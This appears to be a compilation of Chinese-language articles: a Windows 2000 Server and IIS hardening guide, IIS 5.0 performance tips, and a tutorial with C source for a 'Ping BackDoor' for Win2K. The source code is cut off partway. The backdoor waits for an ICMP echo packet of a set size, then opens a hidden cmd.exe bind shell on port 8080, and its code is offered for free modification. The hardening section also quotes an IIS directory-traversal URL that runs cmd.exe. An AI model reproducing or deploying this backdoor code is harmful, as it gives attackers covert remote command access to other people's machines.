其次，补丁的安装：补丁的安装应该在所有应用程序安装完之后，因为补丁程序往往要替换/修改某些系统文件，如果先安装补丁再安装应用程序有可能导致补丁不能起到应有的效果，例如：IIS的HotFix就要求每次更改IIS的配置都需要安装（变不变态？） 
三、 安全配置WIN2000 SERVER 
即使正确的安装了WIN2000 SERVER，系统还是有很多的漏洞，还需要进一步进行细致地配置。 
1．端口：端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口会比较安全，配置的方法是在网卡属性-TCP/IP-高级-选项-TCP/IP筛选中启用TCP/IP筛选，不过对于win2000的端口过滤来说，有一个不好的特性：只能规定开哪些端口，不能规定关闭哪些端口，这样对于需要开大量端口的用户就比较痛苦。 
2．IIS：IIS是微软的组件中漏洞最多的一个，平均两三个月就要出一个漏洞，而微软的IIS默认安装又实在不敢恭维，所以IIS的配置是我们的重点，现在大家跟着我一起来： 
首先，把C盘那个什么Inetpub目录彻底删掉，在D盘建一个Inetpub（要是你不放心用默认目录名也可以改一个名字，但是自己要记得）在IIS管理器中将主目录指向D:\Inetpub； 
其次，那个IIS安装时默认的什么s cripts等虚拟目录一概删除（罪恶之源呀，忘http://www.target.com/s cripts/..%c1%1c../winnt/system32/cmd.exe了？我们虽然已经把Inetpub从系统盘挪出来了，但是还是小心为上），如果你需要什么权限的目录可以自己慢慢建，需要什么权限开什么。（特别注意写权限和执行程序的权限，没有绝对的必要千万不要给） 
第三，应用程序配置：在IIS管理器中删除必须之外的任何无用映射，必须指的是ASP, ASA和其他你确实需要用到的文件类型，例如你用到stml等（使用server side include），实际上90%的主机有了上面两个映射就够了，其余的映射几乎每个都有一个凄惨的故事：htw, htr, idq, ida……想知道这些故事？去查以前的漏洞列表吧。什么？找不到在哪里删？在IIS管理器中右击主机->属性->WWW服务 编辑->主目录 配置->应用程序映射，然后就开始一个个删吧（里面没有全选的，嘿嘿）。接着在刚刚那个窗口的应用程序调试书签内将脚本错误消息改为发送文本（除非你想ASP出错的时候用户知道你的程序/网络/数据库结构）错误文本写什么？随便你喜欢，自己看着办。点击确定退出时别忘了让虚拟站点继承你设定的属性。 
为了对付日益增多的cgi漏洞扫描器，还有一个小技巧可以参考，在IIS中将HTTP404 Object Not Found出错页面通过URL重定向到一个定制HTM文件，可以让目前绝大多数CGI漏洞扫描器失灵。其实原因很简单，大多数CGI扫描器在编写时为了方便，都是通过查看返回页面的HTTP代码来判断漏洞是否存在的，例如，著名的IDQ漏洞一般都是通过取1.idq来检验，如果返回HTTP200，就认为是有这个漏洞，反之如果返回HTTP404就认为没有，如果你通过URL将HTTP404出错信息重定向到HTTP404.htm文件，那么所有的扫描无论存不存在漏洞都会返回HTTP200，90%的CGI扫描器会认为你什么漏洞都有，结果反而掩盖了你真正的漏洞，让入侵者茫然无处下手（武侠小说中常说全身漏洞反而无懈可击，难道说的就是这个境界？）不过从个人角度来说，我还是认为扎扎实实做好安全设置比这样的小技巧重要的多。 
最后，为了保险起见，你可以使用IIS的备份功能，将刚刚的设定全部备份下来，这样就可以随时恢复IIS的安全配置。还有，如果你怕IIS负荷过高导致服务器满负荷死机，也可以在性能中打开CPU限制，例如将IIS的最大CPU使用率限制在70%。 
3．账号安全： 
Win2000的账号安全是另一个重点，首先，Win2000的默认安装允许任何用户通过空用户得到系统所有账号/共享列表，这个本来是为了方便局域网用户共享文件的，但是一个远程用户也可以得到你的用户列表并使用暴力法破解用户密码。很多朋友都知道可以通过更改注册表Local_Machine\System\CurrentControlSet\Control\LSA-RestrictAnonymous = 1来禁止139空连接，实际上win2000的本地安全策略（如果是域服务器就是在域服务器安全和域安全策略中）就有这样的选项RestrictAnonymous（匿名连接的额外限制），这个选项有三个值： 
0：None. Rely on default permissions（无，取决于默认的权限） 
1：Do not allow enumeration of SAM accounts and shares（不允许枚举SAM帐号和共享） 
2：No access without explicit anonymous permissions（没有显式匿名权限就不允许访问） 
0这个值是系统默认的，什么限制都没有，远程用户可以知道你机器上所有的账号、组信息、共享目录、网络传输列表(NetServerTransportEnum等等，对服务器来说这样的设置非常危险。 
1这个值是只允许非NULL用户存取SAM账号信息和共享信息。 
2这个值是在win2000中才支持的，需要注意的是，如果你一旦使用了这个值，你的共享估计就全部完蛋了，所以我推荐你还是设为1比较好。 
好了，入侵者现在没有办法拿到我们的用户列表，我们的账户安全了……慢着，至少还有一个账户是可以跑密码的，这就是系统内建的administrator，怎么办？我改改改，在计算机管理->用户账号中右击administrator然后改名，改成什么随便你，只要能记得就行了。 
不对不对，我都已经改了用户名了，怎么还是有人跑我管理员的密码？幸好我的密码够长，但是这也不是办法呀？嗯，那肯定是在本地或者Terminal Service的登录界面看到的，好吧，我们再来把HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\winlogon项中的Don’t Display Last User Name串数据改成1，这样系统不会自动显示上次的登录用户名。 
将服务器注册表HKEY_LOCAL_ MACHINE\SOFTWARE\Microsoft\ WindowsNT\CurrentVersion\Winlogon项中的Don't Display Last User Name串数据修改为1，隐藏上次登陆控制台的用户名。（哇，世界清静了） 
　　 5．安全日志：我遇到过这样的情况，一台主机被别人入侵了，系统管理员请我去追查凶手，我登录进去一看：安全日志是空的，倒，请记住：Win2000的默认安装是不开任何安全审核的！那么请你到本地安全策略->审核策略中打开相应的审核，推荐的审核是： 
账户管理 成功 失败 
登录事件 成功 失败 
对象访问 失败 
策略更改 成功 失败 
特权使用 失败 
系统事件 成功 失败 
目录服务访问 失败 
账户登录事件 成功 失败 
审核项目少的缺点是万一你想看发现没有记录那就一点都没辙；审核项目太多不仅会占用系统资源而且会导致你根本没空去看，这样就失去了审核的意义。 
与之相关的是： 
在账户策略->密码策略中设定： 
密码复杂性要求 启用 
密码长度最小值 6位 
强制密码历史 5次 
最长存留期 30天 
在账户策略->账户锁定策略中设定： 
账户锁定 3次错误登录 
锁定时间 20分钟 
复位锁定计数 20分钟 
同样，Terminal Service的安全日志默认也是不开的，我们可以在Terminal Service Configration（远程服务配置）-权限-高级中配置安全审核，一般来说只要记录登录、注销事件就可以了。 

7.目录和文件权限： 
为了控制好服务器上用户的权限，同时也为了预防以后可能的入侵和溢出，我们还必须非常小心地设置目录和文件的访问权限，NT的访问权限分为：读取、写入、读取及执行、修改、列目录、完全控制。在默认的情况下，大多数的文件夹对所有用户（Everyone这个组）是完全敞开的（Full Control），你需要根据应用的需要进行权限重设。 
在进行权限控制时，请记住以下几个原则： 
1>限是累计的：如果一个用户同时属于两个组，那么他就有了这两个组所允许的所有权限； 
2>拒绝的权限要比允许的权限高（拒绝策略会先执行）如果一个用户属于一个被拒绝访问某个资源的组，那么不管其他的权限设置给他开放了多少权限，他也一定不能访问这个资源。所以请非常小心地使用拒绝，任何一个不当的拒绝都有可能造成系统无法正常运行； 
3>文件权限比文件夹权限高（这个不用解释了吧？） 
4>利用用户组来进行权限控制是一个成熟的系统管理员必须具有的优良习惯之一； 
5>仅给用户真正需要的权限，权限的最小化原则是安全的重要保障； 
8.预防DoS： 
在注册表HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters中更改以下值可以帮助你防御一定强度的DoS攻击 
SynAttackProtect REG_DWORD 2 
EnablePMTUDiscovery REG_DWORD 0 
NoNameReleaseOnDemand REG_DWORD 1 
EnableDeadGWDetect REG_DWORD 0 
KeepAliveTime REG_DWORD 300,000 
PerformRouterDiscovery REG_DWORD 0 
EnableICMPRedirects REG_DWORD 0 
ICMP攻击：ICMP的风暴攻击和碎片攻击也是NT主机比较头疼的攻击方法，其实应付的方法也很简单，win2000自带一个Routing & Remote Access工具，这个工具初具路由器的雏形（微软真是的，什么都要做？听说最近又要做防火墙了）在这个工具中，我们可以轻易的定义输入输出包过滤器，例如，设定输入ICMP代码255丢弃就表示丢弃所有的外来ICMP报文（让你炸？我丢、丢、丢） 
四、 需要注意的一些事： 
实际上，安全和应用在很多时候是矛盾的，因此，你需要在其中找到平衡点，毕竟服务器是给用户用而不是做OPEN HACK的，如果安全原则妨碍了系统应用，那么这个安全原则也不是一个好的原则。 
网络安全是一项系统工程，它不仅有空间的跨度，还有时间的跨度。很多朋友（包括部分系统管理员）认为进行了安全配置的主机就是安全的，其实这其中有个误区：我们只能说一台主机在一定的情况一定的时间上是安全的，随着网络结构的变化、新的漏洞的发现，管理员/用户的操作，主机的安全状况是随时随地变化着的，只有让安全意识和安全制度贯穿整个过程才能做到真正的安全。 
本文在撰写过程中参阅了大量Win2000安全的文章，在此向这些作者表示感谢。 
提高IIS 5.0网站伺服器的执行效率的八种方法 
　以下是提高IIS 5.0网站伺服器的执行效率的八种方法：
　1. 启用HTTP的持续作用可以改善15~20%的执行效率。
　2. 不启用记录可以改善5~8%的执行效率。
　3. 使用 [独立] 的处理程序会损失20%的执行效率。
　4. 增加快取记忆体的保存档案数量，可提高Active Server Pages之效能。
　5. 勿使用CGI程式。
　6. 增加IIS 5.0电脑CPU数量。
　7. 勿启用ASP侦错功能。
　8. 静态网页采用HTTP 压缩，大约可以减少20%的传输量。
　简单介绍如下。
　1、启用HTTP的持续作用
　启用HTTP的持续作用（Keep-Alive）时，IIS与浏览器的连线不会断线，可以改善执行效率，直到浏览器关闭时连线才会断线。因为维持「Keep-Alive」状态时，於每次用户端请求时都不须重新建立一个新的连接，所以将改善伺服器的效率。
　此功能为HTTP 1.1预设的功能，HTTP 1.0加上Keep-Alive header也可以提供HTTP的持续作用功能。
　2、启用HTTP的持续作用可以改善15~20%的执行效率。
　如何启用HTTP的持续作用呢？步骤如下：
　在 [Internet服务管理员] 中，选取整个IIS电脑、或Web站台，於 [内容] 之 [主目录] 页，勾选 [HTTP的持续作用] 选项。
　3、不启用记录
　不启用记录可以改善5~8%的执行效率。
　如何设定不启用记录呢？步骤如下：
　在 [Internet服务管理员] 中，选取整个IIS电脑、或Web站台，於 [内容] 之 [主目录] 页，不勾选 [启用记录] 选项。
　设定非独立的处理程序
　使用 [独立] 的处理程序会损失20%的执行效率，此处所谓「独立」系指将 [主目录]、[虚拟目录] 页之应用程式保护选项设定为 [高（独立的）] 时。因此 [应用程式保护] 设定为 [低 (IIS处理程序)] 时执行效率较高，设定画面如下：
　如何设定非「独立」的处理程序呢？步骤如下：
　在 [Internet服务管理员] 中，选取整个IIS电脑、Web站台、或应用程式的起始目录。於 [内容] 之 [主目录]、[虚拟目录] 页，设定应用程式保护选项为 [低 (IIS处理程序)] 。
　4、调整快取（Cache）记忆体
　IIS 5.0将静态的网页资料暂存於快取（Cache）记忆体当中；IIS 4.0则将静态的网页资料暂存於档案当中。调整快取（Cache）记忆体的保存档案数量可以改善执行效率。
　ASP指令档案执行过後，会在暂存於快取（Cache）记忆体中以提高执行效能。增加快取记忆体的保存档案数量，可提高Active Server Pages之效能。
　可以设定所有在整个IIS电脑、「独立」Web站台、或「独立」应用程式上执行之应用程式的快取记忆体档案数量。
　如何设定快取（Cache）功能呢？步骤如下：
　在 [Internet服务管理员] 中，选取整个IIS电脑、「独立」Web站台、或「独立」应用程式的起始目录。於 [内容] 之 [主目录]、[虚拟目录] 页，按下 [设定] 按钮时，即可由 [处理程序选项] 页设定 [指令档快取记忆体] 。
　如何设定快取（Cache）记忆体档案数量呢？步骤如下：
　在 [Internet服务管理员] 中，选取整个IIS电脑、或Web站台的起始目录。於 [内容] 之 [伺服器扩充程式] 页，按下 [设定] 按钮。
　即可设定快取（Cache）记忆体档案数量。
　5、勿使用CGI程式
　使用CGI程式时，因为处理程序（Process）须不断地产生与摧毁，造成执行效率不佳。
　一般而言，执行效率比较如下：
　 　 静态网页（Static）：100
　 　 ISAPI：50
　 　 ASP：10
　 　 CGI：1
　换句话说，ASP比CGI可能快10倍，因此勿使用CGI程式可以改善IIS的执行效率。
　以弹性（Flexibility）而言：ASP > CGI > ISAPI > 静态网页（Static）。
　以安全（Security）而言：ASP（独立） = ISAPI（独立）= CGI > ASP（非独立） = ISAPI（非独立）= 静态网页（Static）。
　6、增加IIS 5.0电脑CPU数量
　根据微软的测试报告，增加IIS 4.0电脑CPU数量，执行效率并不会改善多少；但是增加IIS 5.0电脑CPU数量，执行效率会几乎成正比地提供，换句话说，两颗CPU的IIS 5.0电脑执行效率几乎是一颗CPU电脑的两倍，四颗CPU的IIS 5.0电脑执行效率几乎是一颗CPU电脑的四倍。
　IIS 5.0将静态的网页资料暂存於快取（Cache）记忆体当中；IIS 4.0则将静态的网页资料暂存於档案当中。调整快取（Cache）记忆体的保存档案数量可以改善执行效率。
　7、启用ASP侦错功能
　勿启用ASP侦错功能可以改善执行效率。
　如何勿启用ASP侦错功能呢？步骤如下：
　於 [Internet服务管理员] 中，选取Web站台、或应用程式的起始目录，按右键选择 [内容]，按 [主目录]、[虚拟目录] 或 [目录] 页，按下 [设定] 按钮，选择 [应用程式侦错] 页，不勾选 [启用ASP伺服器端指令侦错]、[启用ASP用户端指令侦错] 选项。
　8、静态网页采用HTTP 压缩
　静态网页采用HTTP 压缩，大约可以减少20%的传输量。
　HTTP压缩功能启用或关闭，系针对整台IIS伺服器来设定。
　用户端使用IE 5.0浏览器连线到已经启用HTTP压缩IIS 5.0之Web伺服器，才有HTTP压缩功能。
　如何启用HTTP压缩功能呢？步骤如下：
　若要启用HTTP压缩功能，方法为在 [Internet服务管理员] 中，选取电脑之 [内容]，於 [主要内容] 之下选取 [WWW服务]。然後按一下 [编辑] 按钮，於 [服务] 页上，选取 [压缩静态档案] 可以压缩静态档案，不选取 [压缩应用程式档案] 。
　动态产生的内容档案（压缩应用程式档案）也可以压缩，但是须耗费额外CPU处理时间，若% Processor Time已经百分之八十或更多时，建议不要压缩。  
Win2000 下Ping 后门的简单实现 
试验环境 Win2K + VC++6.0 
1. 初期的想法 
　　在使用了小榕的Remotenc后，总觉得老是开放着一个端口不是很好，很容易被发现。能不能在Win2000下实现 
象Ping BackDoor for Linux/Solaris等类似的功能呢？把这个后门安装成服务，但不开端口，当接收到特定 
大小的ping 包以后，就打开一个特定的端口接收连接。OK，我来试试：） 
2. 尝试 
　　记得以前玩lion worm时改写过一个Ping BackDoor for Linux，所以开始时我就想能不能把这个移植到Win2000 
下。于是就简单的改了一下，开了个连接，接受ICMP包（ICMP全称是Internet Control Message Protocol－－互联网控 
制报文协议　它是IP协议的附属协议，用来传递差错报文以及其他需要注意的消息报文。我们常用的Ping就是用ICMP 
来进行通讯的），以为Windows能象linux下一样乖乖的把收到的ICMP包交给自己的 socket，结果ping了老半天没收到 
一个bit。 
　　于是就开始在google上查找资料，最后终于知道了如果要在Win2000下实现类似Ping BackDoor for Linux的后门， 
必须以 sniffer 的方式监听ICMP包，而在win2000下写一个简单的sniffer并不需要自己编写驱动。：）中文详细资料 
请看绿盟zhangbo的 无需驱动程序的Sniffer－IPMon　一文, WinSock 2 允许程序使用WSAIoctl( )给一个SOCK_RAW类型 
的socket设置SIO_RCVALL属性，该socket就可以收到所有经过本机的数据。 
3.具体实现方法如下： 
　　(1) 创建一个SOCK_RAW socket 
　　// 创建一个原始socket, 接受所有接收的包(sniffer) 
　　if ((socksniffer = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) 
　　{ 　　　　printf("WSASocket() failed: %d\n", WSAGetLastError()); 
　　　　return -1; 
　　} 
　　(2) 将该socket与本机的某个网络接口绑定 
　　// 取得本地地址 
　　gethostname((char*)LocalName, sizeof(LocalName)-1); 
　　if((hp = gethostbyname((char*)LocalName)) == NULL) 
　　{ 
　　　　return -1; 
　　} 
　　memset(&dest,0,sizeof(dest)); 
　　memcpy(&dest.sin_addr.s_addr, hp->h_addr_list[0], hp->h_length);　　// TCP嗅探选项 
　　dest.sin_family = AF_INET; 
　　dest.sin_port = htons(8000);　　　　　　　　　　　　// 指定任意端口 
　　// socket bind 
　　bind(socksniffer, (PSOCKADDR)&dest, sizeof(dest)); 
　　(3) 用WSAIoctl( )给一个SOCK_RAW socket设置SIO_RCVALL属性 
　　// 设置socket为接受所有包 
　　WSAIoctl(socksniffer, SIO_RCVALL, &dwBufferInLen, sizeof(dwBufferInLen), &dwBufferLen, 
　　　　　　　　　sizeof(dwBufferLen),&dwBytesReturned , NULL , NULL ); 
　　(4) 循环读取嗅探到的包，判断包的大小是否为设定要监听的包的大小再把数据交给 sniffer 解包程序处理 
(当然你也可以先判断是否为ICMP包) 
　　// 循环监听包的大小 
　　while(1) 
　　{ 
　　　　// 读数据 
　　　　sread = recvfrom(socksniffer, recvbuf, MAX_PACKET, 0, (struct sockaddr*)&from, &fromlen); 
　　　　// 如果读数据出错 
　　　　if (sread == SOCKET_ERROR || sread < 0) 
　　　　{ 
　　　　　　if (WSAGetLastError() == WSAETIMEDOUT) 
　　　　　　　　continue; 
　　　　　　printf("recvfrom failed: %d\n",WSAGetLastError()); 
　　　　　　return -1; 
　　　　} 
　　　　else 
　　　　// 如果读到数据的大小 == 监听包的大小 + 28 
　　　　if ( sread == packsize + 28) 
　　　　{ 
　　　　　　// 将接收到的数据交给 sniffer 解包程序处理 
　　　　　　decode_sniffer(recvbuf, sread - 28, &from); 
　　　　} 
　　} 
　　(5) sniffer 解包程序再判断读取的包是否为 ICMP_ECHO ICMP回显请求报文 
　　sniffer解包这里的处理很简单，大家可以任意发挥．：） 
1.首先定义IP和ICMP首部，以便于解包程序解包 
　　// 定义IP 首部 
　　typedef struct iphdr 
　　{ 
　　　　unsigned char h_verlen;　　　　　　// 4位首部长度,4位IP版本号 
　　　　unsigned char tos;　　　　　　// 8位服务类型TOS 
　　　　unsigned short total_len;　　　　// 16位总长度(字节) 
　　　　unsigned short ident;　　　　　　// 16位标识 
　　　　unsigned short frag_and_flags;　　　　// 3位标志位 
　　　　unsigned char ttl;　　　　　　// 8位生存时间 TTL 
　　　　unsigned char proto;　　　　　　// 8位协议(TCP, UDP 或其他) 
　　　　unsigned short checksum;　　　　// 16位IP首部校验和 
　　　　unsigned int sourceIP;　　　　　　// 32位源IP地址 
　　　　unsigned int destIP;　　　　　　// 32位目的IP地址 
　　} IPHeader;　　　　　　　　　　// IP首部长度为20 
　　// 定义ICMP首部 
　　typedef struct _ihdr 
　　{ 
　　　　unsigned char i_type;　　　　　　// 8位类型 
　　　　unsigned char i_code;　　　　　　// 8位代码 
　　　　unsigned short i_cksum;　　　　　　// 16位校验和 
　　　　unsigned short i_id;　　　　　　// 识别号(一般用进程号作为识别号) 
　　　　unsigned short i_seq;　　　　　　// 报文序列号 
　　} ICMPHeader;　　　　　　　　　　// ICMP首部长度为8 
2. 简单sniffer解包程序，如果收到的包为ICMP_ECHO 类型，且大小为监听的包的大小，就开一个bindshell 
　　// 简单Sniffer 解包程序 
　　void decode_sniffer(char *buf, int bytes, struct sockaddr_in *from) 
　　{ 
　　　　ICMPHeader *icmphdr; 
　　　　// ICMP首部的地址等于buf+IP首部长度:buf+20 
　　　　icmphdr = (ICMPHeader *)(buf + sizeof(IPHeader)); 
　　　　// 简单判断如果为icmp 请求包 
　　　　if (icmphdr->i_type == ICMP_ECHO) 
　　　　{ 
　　　　　　// bind shell 
　　　　　　bindshell(NULL); 
　　　　} 
　　　　else 
　　　　printf("\r\n Get Other Packets!"); 
　　　　return; 
　　} 
　　(6) bind shell的实现 
　　1.在指定端口创建一个server socket接受连接 
　　// 创建一个socket 
　　bindServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
　　// 服务器地址和端口指定 
　　addrServer.sin_family = AF_INET; 
　　addrServer.sin_port = htons(bport); 
　　addrServer.sin_addr.s_addr = ADDR_ANY; 
　　// 设置超时60s 
　　int TimeOut = 60000; 
　　setsockopt(bindServer, SOL_SOCKET, SO_RCVTIMEO, (char*)&TimeOut, sizeof(TimeOut)); 
　　// 监听端口 
　　bind(bindServer, (struct sockaddr*)&addrServer, sizeof(addrServer)); 
　　listen(bindServer, 2); 
　　printf("\r\n Bind Port on %d ok.", bport); 
　　// 接受client连接 
　　int iLen = sizeof(addrClient); 
　　2.如果有连接进来就为连接新建一个socket句柄 getClient 
　　// 接收1次连接 
　　SOCKET getClient = accept(bindServer, (struct sockaddr*)&addrClient, &iLen); 
　　if(getClient != INVALID_SOCKET) 
　　{ 
　　　　// 如果有连接进来设置延时为60S 
　　　　int iTimeOut = 60000; 
　　　　setsockopt(getClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&iTimeOut, sizeof(iTimeOut)); 
　　} 
　　else return -1; 
3.有连接进来后开一个绑定cmd.exe的进程执行输入的命令，并把执行的结果返回给socket getClient 
　　　3.1 首先创建两个匿名管道，一个用于新进程的输入，一个用于新进程的输出 
　　// 建两个匿名管道 
　　HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;　　　　　 
　　SECURITY_ATTRIBUTES sa; 
　　sa.nLength=12; 
　　sa.lpSecurityDescriptor=0; 
　　sa.bInheritHandle=TRUE; 
　　CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0); // pipe1 
　　CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0); // pipe2 
3.2 创建一个绑定cmd.exe的进程, 由hReadPipe2读数据,向hWritePipe1写数据 
　　// 创建一个cmd进程, 由hReadPipe2读数据,向hWritePipe1写数据 
　　char cmdLine[] = "cmd.exe"; 
　　STARTUPINFO siinfo; 
　　PROCESS_INformATION ProcessInformation; 
　　ZeroMemory(&siinfo,sizeof(siinfo)); 
　　siinfo.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES; 
　　siinfo.wShowWindow = SW_HIDE; 
　　siinfo.hStdInput = hReadPipe2;　　　　　　　　　　　　// 新进程读取写入pipe2的数据 
　　siinfo.hStdOutput = siinfo.hStdError = hWritePipe1;　　// 新进程向pipe1写数据 
CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation); 
3.3 循环读取hReadPipe1和连接是否有数据 
　　　　把新进程的输出（hWritePipe1）数据写入新连接中， 
　　　　把从socket getClient收到的数据写入进进程的输入管道（Pipe2） 
　　unsigned long lBytesRead; 
　　while(1) 
　　{ 
　　　　// 检查管道pipe1是否有数据返回 
　　　　ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0); 
　　　　if(lBytesRead) 
　　　　{ 
　　　　　　// 从管道pipe1读数据 
　　　　　　ret = ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
　　　　　　if(!ret) break; 
　　　　　　 　　　　　　// 把从管道pipe1读到的数据写入连接 getClient 
　　　　　　ret = send(getClient,Buff,lBytesRead,0); 
　　　　　　if(ret <= 0) break; 
　　　　} 
　　　　else 
　　　　{ 
　　　　　　// 如果连接 getClient 有接收到数据 
　　　　　　lBytesRead = recv(getClient,Buff,1024,0); 
　　　　　　if(lBytesRead <= 0) break;　　　 
　　　　　　// 把从连接 getClient 读到的数据写入Pipe2 
　　　　　　ret = WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
　　　　　　if(!ret) break; 
　　　　} 
　　} 
(7) 程序完工:) 
4. 附简单的 Ping BackDoor for Win2K 源代码 
大家可以任意修改：） 
ICMP Shell for Win2K 正在编写中,请稍侯.:) 
/* ====================================================================== 
Ping BackDoor V0.1 For Win2K 
Code by Lion. Welcome to Http://www.cnhonker.net 
========================================================================= */ 
#include <stdio.h> 
#include <stdlib.h> 
#include <winsock2.h> 
//#include <ws2tcpip.h> 
#include <mstcpip.h> 
#define ICMP_ECHO 8　　　　　　　　　　// ICMP回显请求报文的类型值为8 
#define ICMP_ECHOREPLY 0　　　　　　// ICMP回显应答报文的类型值为0 
#define SNIFFER_ICMP_SIZE 101　　　　// 监听ICMP包的大小 
#define BIND_PORT 8080　　　　　　　　// 默认bind shell 端口 
#define MAX_PACKET 10000　　　　　　// 最大ICMP包的大小 
#define DEF_PASSWORD "givemeshell!" // 默认密码 
#define xmalloc(s) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,(s)) 
// 定义IP 首部 
typedef struct iphdr 
{ 
　　unsigned char h_verlen;　　　　　　// 4位首部长度,4位IP版本号　　　1 
　　unsigned char tos;　　　　　　　　// 8位服务类型TOS　　　　　　　　1 
　　unsigned short total_len;　　　　// 16位总长度(字节)　　　　　　　2　 
　　unsigned short ident;　　　　　　// 16位标识　　　　　　　　　　　2 
　　unsigned short frag_and_flags;　　// 3位标志位　　　　　　　　　　2 
　　unsigned char ttl;　　　　　　　　// 8位生存时间 TTL　　　　　　　1 
　　unsigned char proto;　　　　　　// 8位协议(TCP, UDP 或其他)　　　　1 
　　unsigned short checksum;　　　　// 16位IP首部校验和　　　　　　　　2 
　　unsigned int sourceIP;　　　　　　// 32位源IP地址　　　　　　　　　4 
　　unsigned int destIP;　　　　　　// 32位目的IP地址　　　　　　　　　4 
} IPHeader;　　　　　　　　　　　　　　// IP首部长度为:　　　　　　　　20 
// 定义ICMP首部 
typedef struct _ihdr 
{ 
　　unsigned char i_type;　　　　　　// 8位类型　　　　　　　　　　　　　1 
　　unsigned char i_code;　　　　　　// 8位代码　　　　　　　　　　　　　1 
　　unsigned short i_cksum;　　　　　　// 16位校验和　　　　　　　　　　2 
　　unsigned short i_id;　　　　　　// 识别号(一般用进程号作为识别号)　　2 
　　unsigned short i_seq;　　　　　　// 报文序列号　　　　　　　　　　　2 
} ICMPHeader;　　　　　　　　　　　　// ICMP首部长度为:　　　　　　　　　8 
int sniffer();　　　　　　　　　　　　　　　　　　　　　　// 监听ICMP 大小 
void decode_sniffer(char *, int, struct sockaddr_in *);　// 简单Sniffer 解包程序 
DWORD CALLBACK bindshell(LPVOID);　　　　　　　　　　　　// bind shell 
DWORD dwBufferLen[10]; 
DWORD dwBufferInLen = 1; 
DWORD dwBytesReturned = 0; 
HANDLE bindthread; 
// ICMPDoor 主函数 
int main(int argc, char **argv) 
{ 
　　WSADATA wsaData; 
　　int retval; 
　　 
　　// socket 初始化 
　　if ((retval = WSAStartup(MAKEWORD(2,2), &wsaData)) != 0) 
　　{ 
　　　　printf("WSAStartup failed: %d\n",retval); 
　　　　exit(-1); 
　　} 
　　// sniffer 开始 
　　sniffer(); 
　　// socket 结束 
　　WSACleanup(); 
　　return 0; 
} 
// sniffer 主函数 
int sniffer() 
{ 
　　int packsize = SNIFFER_ICMP_SIZE; 
　　SOCKET socksniffer; 
　　struct sockaddr_in dest,from; 
　　struct hostent * hp; 
　　int sread; 
　　int fromlen = sizeof(from); 
　　unsigned char LocalName[256]; 
　　char *recvbuf;　　 
　　// 创建一个原始socket, 接受所有接收的包(sniffer) 
　　if ((socksniffer = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) 
　　{ 
　　　　printf("WSASocket() failed: %d\n", WSAGetLastError()); 
　　　　return -1; 
　　} 
　　// 取得本地地址 
　　gethostname((char*)LocalName, sizeof(LocalName)-1); 
　　if((hp = gethostbyname((char*)LocalName)) == NULL) 
　　{ 
　　　　return -1; 
　　} 
　　memset(&dest,0,sizeof(dest)); 
　　memcpy(&dest.sin_addr.s_addr, hp->h_addr_list[0], hp->h_length);　　// TCP嗅探选项 
　　dest.sin_family = AF_INET; 
　　dest.sin_port = htons(8000);　　　　　　　　　　　　　　　　　　　　// 指定任意端口 
　　// socket bind 
　　bind(socksniffer, (PSOCKADDR)&dest, sizeof(dest)); 
　　// 设置socket为接受所有包 
　　WSAIoctl(socksniffer, SIO_RCVALL, &dwBufferInLen, sizeof(dwBufferInLen), &dwBufferLen, sizeof(dwBufferLen),&dwBytesReturned , NULL , NULL ); 
　　// 分配socket接收缓冲区大小为MAX_PACKET 
　　recvbuf = (char *)xmalloc(MAX_PACKET); 
　　// 循环监听包的大小 
　　while(1) 
　　{ 
　　　　// 读数据 
　　　　sread = recvfrom(socksniffer, recvbuf, MAX_PACKET, 0, (struct sockaddr*)&from, &fromlen); 
　　　　// 如果读数据出错 
　　　　if (sread == SOCKET_ERROR || sread < 0) 
　　　　{ 
　　　　　　if (WSAGetLastError() == WSAETIMEDOUT) 
　　　　　　{ 
　　　　　　　　continue; 
　　　　　　} 
　　　　　　printf("recvfrom failed: %d\n",WSAGetLastError()); 
　　　　　　return -1; 
　　　　} 
　　　　else 
//　　　　if ( sread >= 28) 
　　　　// 如果读到数据的大小 == 监听包的大小 + 28 
　　　　if ( sread == packsize + 28) 
　　　　{ 
　　　　　　// 将接收到的数据交给 sniffer 解包程序处理 
　　　　　　decode_sniffer(recvbuf, sread - 28, &from); 
　　　　} 
　　} 
　　return 1; 
} 
// 简单Sniffer 解包程序 
void decode_sniffer(char *buf, int bytes, struct sockaddr_in *from) 
{ 
　　ICMPHeader *icmphdr; 
　　// ICMP首部的地址等于buf+IP首部长度:buf+20 
　　icmphdr = (ICMPHeader *)(buf + sizeof(IPHeader));　　 
/* 
　　printf("\r\n %d bytes from %s,", bytes, inet_ntoa(from->sin_addr));　　　　// 取出接收数据 
　　printf(" ICMP_Type: %d", icmphdr->i_type);　　　　　　　　　　// 取出类型 
　　printf(" ICMP_Seq: %d\r\n", icmphdr->i_seq);　　　　　　　　　　// 取出序列号 
　　　　 
　　//取出数据段 buf + 28 + i 
　　for(int i = 0; i < bytes - 1; i++) 
　　{ 
　　　　printf("%c", *(buf + sizeof(IPHeader) + sizeof(ICMPHeader) + i));　　 
　　} 
*/ 
　　 
//　　if (icmphdr->i_type == ICMP_ECHO || icmphdr->i_type == ICMP_ECHOREPLY) 
　　// 简单判断如果为icmp 请求包 
　　if (icmphdr->i_type == ICMP_ECHO) 
　　{ 
　　　　// bind shell 
　　　　bindshell(NULL); 
　　　　 
//　　　　DWORD bid; 
//　　　　bindthread = CreateThread(NULL, 0, bindshell, 0, 0, &bid); 
